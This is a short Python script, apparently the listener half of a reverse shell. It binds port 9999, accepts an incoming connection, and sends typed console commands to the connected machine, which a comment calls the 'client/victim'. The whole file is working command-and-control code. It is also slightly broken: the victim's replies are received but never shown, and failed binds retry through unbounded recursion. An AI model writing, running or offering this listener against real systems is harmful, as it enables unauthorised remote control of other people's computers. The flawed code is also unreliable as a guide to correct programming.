import socket
import sys

# Create a Socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s_ocket
        host =""
        port =9999
        s_ocket = socket.socket() # create socket
    except socket.error as msg:
        print("Socket creation error: "+str(msg))

#binding the socket and listening  for connections
def bind_socket():
    try:
        global host
        global port
        global s_ocket

        print("Binding the Port"+ str(port))
        s_ocket.bind((host,port))
        s_ocket.listen(5)

    except socket.error as msg:
        print("Socket Binding Error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s_ocket.accept()
    print("Connection has been established! |"+ "IP "+ address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        console = input()
        if console == "quit":
            conn.close()
            s_ocket.close()
            sys.exit()
        if len(str.encode(console)) > 0:
            conn.send(str.encode(console))
            client_response = str(conn.recv(1024), "utf-8")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()